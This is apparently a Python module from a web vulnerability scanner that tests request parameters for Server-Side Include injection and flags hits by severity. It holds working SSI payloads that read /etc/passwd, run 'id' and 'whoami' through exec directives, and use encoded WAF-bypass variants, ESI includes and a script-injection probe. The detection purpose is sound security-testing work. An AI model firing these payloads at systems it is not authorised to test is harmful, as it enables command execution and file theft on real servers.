"""
Server-Side Include (SSI) Injection Scanner
Detects SSI injection vulnerabilities that can lead to RCE, LFI, and information disclosure
Reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection
"""

from core.base_module import BaseModule
from core.logger import get_logger
from typing import List, Dict, Any
from urllib.parse import urlparse, parse_qs, urlencode
import re
import time

logger = get_logger(__name__)


class SSIScanner(BaseModule):
    """Scans for Server-Side Include injection vulnerabilities"""

    def __init__(self, module_path: str, payload_limit: int = None):
        super().__init__(module_path, payload_limit=payload_limit)
        self.module_name = "SSI Injection Scanner"
        self.logger = logger

        # Generate unique marker for detection
        self.marker = f"SSI{int(time.time()) % 100000}"

        # SSI Injection payloads with expected responses
        self.payloads = [
            # Basic SSI directives - printenv
            {
                'payload': '<!--#printenv -->',
                'detect': ['SERVER_', 'PATH=', 'HTTP_', 'DOCUMENT_ROOT'],
                'type': 'info_disclosure',
                'desc': 'SSI printenv - Environment variable disclosure'
            },

            # Echo directives
            {
                'payload': '<!--#echo var="DATE_LOCAL" -->',
                'detect': [r'\d{4}', r'\d{2}:\d{2}'],  # Date/time patterns
                'type': 'info_disclosure',
                'desc': 'SSI echo DATE_LOCAL'
            },
            {
                'payload': '<!--#echo var="DOCUMENT_ROOT" -->',
                'detect': ['/var/www', '/home/', '/usr/', 'htdocs', 'www'],
                'type': 'info_disclosure',
                'desc': 'SSI echo DOCUMENT_ROOT - Path disclosure'
            },
            {
                'payload': '<!--#echo var="DOCUMENT_NAME" -->',
                'detect': ['.shtml', '.html', '.php', '.asp'],
                'type': 'info_disclosure',
                'desc': 'SSI echo DOCUMENT_NAME'
            },
            {
                'payload': '<!--#echo var="LAST_MODIFIED" -->',
                'detect': [r'\d{4}', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec'],
                'type': 'info_disclosure',
                'desc': 'SSI echo LAST_MODIFIED'
            },

            # Config directives
            {
                'payload': '<!--#config timefmt="%Y" --><!--#echo var="DATE_LOCAL" -->',
                'detect': ['2024', '2025', '2026'],
                'type': 'info_disclosure',
                'desc': 'SSI config timefmt + echo'
            },

            # Include directives - LFI
            {
                'payload': '<!--#include virtual="/etc/passwd" -->',
                'detect': ['root:', '/bin/bash', '/bin/sh', 'nobody:'],
                'type': 'lfi',
                'desc': 'SSI include /etc/passwd - Local File Inclusion'
            },
            {
                'payload': '<!--#include file="/etc/passwd" -->',
                'detect': ['root:', '/bin/bash', '/bin/sh', 'nobody:'],
                'type': 'lfi',
                'desc': 'SSI include file /etc/passwd'
            },
            {
                'payload': '<!--#include virtual="../../../etc/passwd" -->',
                'detect': ['root:', '/bin/bash', '/bin/sh'],
                'type': 'lfi',
                'desc': 'SSI include path traversal'
            },
            {
                'payload': '<!--#include virtual="C:\\Windows\\System32\\drivers\\etc\\hosts" -->',
                'detect': ['localhost', '127.0.0.1'],
                'type': 'lfi',
                'desc': 'SSI include Windows hosts file'
            },

            # Command execution
            {
                'payload': f'<!--#exec cmd="echo {self.marker}" -->',
                'detect': [self.marker],
                'type': 'rce',
                'desc': 'SSI exec cmd - Remote Code Execution'
            },
            {
                'payload': '<!--#exec cmd="id" -->',
                'detect': ['uid=', 'gid=', 'groups='],
                'type': 'rce',
                'desc': 'SSI exec cmd id - RCE confirmed'
            },
            {
                'payload': '<!--#exec cmd="whoami" -->',
                'detect': ['www-data', 'apache', 'nginx', 'nobody', 'root', 'Administrator'],
                'type': 'rce',
                'desc': 'SSI exec cmd whoami'
            },
            {
                'payload': '<!--#exec cgi="/cgi-bin/printenv.pl" -->',
                'detect': ['SERVER_', 'HTTP_', 'PATH'],
                'type': 'rce',
                'desc': 'SSI exec cgi'
            },

            # Encoded payloads for WAF bypass
            {
                'payload': '<!--%23exec%20cmd="id"%20-->',
                'detect': ['uid=', 'gid='],
                'type': 'rce',
                'desc': 'SSI exec URL encoded'
            },
            {
                'payload': '<<!--#exec cmd="id"-->',
                'detect': ['uid=', 'gid='],
                'type': 'rce',
                'desc': 'SSI exec with prefix bypass'
            },

            # Edge SSI (for CDNs like Akamai)
            {
                'payload': '<esi:include src="http://localhost/test" />',
                'detect': ['error', 'ESI', 'include'],
                'type': 'esi',
                'desc': 'ESI include (Edge Side Include)'
            },
            {
                'payload': '<!--esi <esi:include src="http://localhost/" /> -->',
                'detect': ['error', 'ESI'],
                'type': 'esi',
                'desc': 'ESI include comment wrapped'
            },

            # XSS via SSI
            {
                'payload': f'<!--#set var="x" value="<script>alert({self.marker})</script>" --><!--#echo var="x" -->',
                'detect': [f'<script>alert({self.marker})</script>'],
                'type': 'xss_via_ssi',
                'desc': 'XSS via SSI set/echo'
            },
        ]

    def scan(self, targets: List[Dict[str, Any]], http_client: Any = None) -> List[Dict[str, Any]]:
        """Scan for SSI injection vulnerabilities"""
        self.logger.info(f"Starting {self.module_name} scan on {len(targets)} targets")

        results = []
        tested = set()

        for target in targets:
            url = target.get('url') if isinstance(target, dict) else target
            params = target.get('params', {}) if isinstance(target, dict) else {}
            method = target.get('method', 'GET') if isinstance(target, dict) else 'GET'

            if not url:
                continue

            # Test URL parameters
            if params:
                for param_name in params.keys():
                    test_key = f"{url}:{param_name}"
                    if test_key in tested:
                        continue
                    tested.add(test_key)

                    findings = self._test_parameter(http_client, url, param_name, params, method)
                    results.extend(findings)

                    if self.payload_limit and len(results) >= self.payload_limit:
                        break

            # Also check URL path for .shtml files (SSI-enabled by default)
            parsed = urlparse(url)
            if parsed.path.endswith(('.shtml', '.stm', '.shtm')):
                results.append(self.create_result(
                    vulnerable=True,
                    url=url,
                    parameter='URL',
                    payload='SSI-enabled extension',
                    evidence=f"File extension indicates SSI is enabled: {parsed.path}",
                    severity='Info',
                    method='GET',
                    additional_info={
                        'injection_type': 'SSI Enabled',
                        'description': 'File uses SSI-enabled extension (.shtml/.stm/.shtm)',
                        'cwe': 'CWE-97',
                        'owasp': 'A03:2021'
                    }
                ))

            if self.payload_limit and len(results) >= self.payload_limit:
                break

        self.logger.info(f"{self.module_name} scan complete: {len(results)} findings")
        return results

    def _test_parameter(self, http_client, url: str, param_name: str,
                        params: dict, method: str) -> List[Dict[str, Any]]:
        """Test a single parameter for SSI injection"""
        results = []

        for payload_info in self.payloads:
            payload = payload_info['payload']
            detect_patterns = payload_info['detect']
            vuln_type = payload_info['type']
            desc = payload_info['desc']

            try:
                # Build test request
                test_params = params.copy()
                test_params[param_name] = payload

                if method.upper() == 'POST':
                    response = http_client.post(url, data=test_params)
                else:
                    response = http_client.get(url, params=test_params)

                if not response:
                    continue

                content = response.text

                # Check for detection patterns
                detected = False
                matched_pattern = None

                for pattern in detect_patterns:
                    if pattern.startswith(r'\\') or '\\d' in pattern:
                        # Regex pattern
                        if re.search(pattern, content):
                            detected = True
                            matched_pattern = pattern
                            break
                    else:
                        # String pattern
                        if pattern in content:
                            detected = True
                            matched_pattern = pattern
                            break

                if detected:
                    # Determine severity based on vulnerability type
                    severity_map = {
                        'rce': 'Critical',
                        'lfi': 'High',
                        'info_disclosure': 'Medium',
                        'esi': 'High',
                        'xss_via_ssi': 'Medium'
                    }
                    severity = severity_map.get(vuln_type, 'Medium')

                    results.append(self.create_result(
                        vulnerable=True,
                        url=url,
                        parameter=param_name,
                        payload=payload,
                        evidence=f"{desc} - Detected: '{matched_pattern}' in response",
                        severity=severity,
                        method=method,
                        additional_info={
                            'injection_type': f'SSI Injection ({vuln_type.upper()})',
                            'vulnerability_type': vuln_type,
                            'description': desc,
                            'detected_pattern': matched_pattern,
                            'cwe': 'CWE-97',
                            'owasp': 'A03:2021',
                            'impact': self._get_impact(vuln_type),
                            'remediation': 'Disable SSI or sanitize user input that may be included in SSI-parsed pages'
                        }
                    ))

                    # If we found RCE, no need to test more payloads for this param
                    if vuln_type == 'rce':
                        self.logger.info(f"Critical SSI RCE found in {param_name}!")
                        return results

            except Exception as e:
                self.logger.debug(f"Error testing SSI payload: {e}")

        return results

    def _get_impact(self, vuln_type: str) -> str:
        """Get impact description for vulnerability type"""
        impacts = {
            'rce': 'Remote Code Execution - Attacker can execute arbitrary commands on the server',
            'lfi': 'Local File Inclusion - Attacker can read sensitive files from the server',
            'info_disclosure': 'Information Disclosure - Server configuration and environment exposed',
            'esi': 'Edge Side Include - May allow cache poisoning or backend access',
            'xss_via_ssi': 'Cross-Site Scripting via SSI - Can inject malicious JavaScript'
        }
        return impacts.get(vuln_type, 'Server-Side Include injection vulnerability')


def get_module(module_path: str, payload_limit: int = None):
    """Factory function to create module instance"""
    return SSIScanner(module_path, payload_limit=payload_limit)
